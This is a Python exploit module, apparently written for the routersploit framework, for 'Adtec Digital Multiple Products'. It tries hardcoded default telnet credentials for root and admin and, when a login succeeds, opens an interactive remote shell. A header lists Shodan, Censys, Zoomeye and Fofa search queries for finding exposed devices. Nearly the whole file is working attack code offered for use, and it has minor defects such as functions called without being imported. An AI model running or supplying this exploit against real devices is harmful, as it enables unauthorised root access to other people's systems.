'''
Exploit description: Adtec Digital Multiple Products - Default Hardcoded Credentials Remote Root
Exploit link: https://www.exploitalert.com/view-details.html?id=36445
Shodan search: Adtec
Censys search: Adtec
Zoomeye search: Adtec +after:"2021-04-27"
Fofa search:  Adtec
'''

from routersploit.core.exploit.option import OptIP, OptPort
from routersploit.core.exploit.utils import is_it_honeypot
from routersploit.core.exploit.printer import log
from routersploit.core.telnet.telnet_client import TelnetClient


class Exploit(TelnetClient):
    __info__ = {'name': 'Adtec_Digital_Multiple_Products'}

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(23, "Target HTTP port")

    def __init__(self):
        self.credentials = [("root1", "1root!"), ("admin", "1admin!")]
        self.telnet_client = None

    def telnet_auth(self) -> bool:
        for cred in self.credentials:
            self.telnet_client = self.telnet_create(port=self.port)
            if self.telnet_client.connect():
                if self.telnet_client.login(cred[0], cred[1]):
                    return True
        return False

    def check(self) -> bool:
        return self.telnet_auth()

    def run(self):
        if self.check():
            print_success("Target seams %s:%d is vulnerable", self.target, self.port)
            self.telnet_client.interactive()
            self.telnet_client.close()
        else:
            print_error("Exploit failed - target %s:%d seems to be not vulnerable", self.target, self.port)
